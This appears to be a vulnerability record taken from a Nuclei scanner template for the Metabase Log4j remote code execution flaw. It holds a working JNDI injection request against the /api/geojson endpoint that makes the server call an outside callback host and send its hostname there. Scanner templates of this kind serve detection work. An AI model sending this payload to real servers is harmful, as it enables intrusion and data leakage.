# Vulnerability: Metabase - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`metabase-log4j-rce.yaml`)

## Description
Metabase is susceptible to remote code execution due to an incomplete patch in Apache Log4j 2.15.0 in certain non-default configurations. A remote attacker can pass malicious data and perform a denial of service attack, exfiltrate data, or execute arbitrary code.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
```

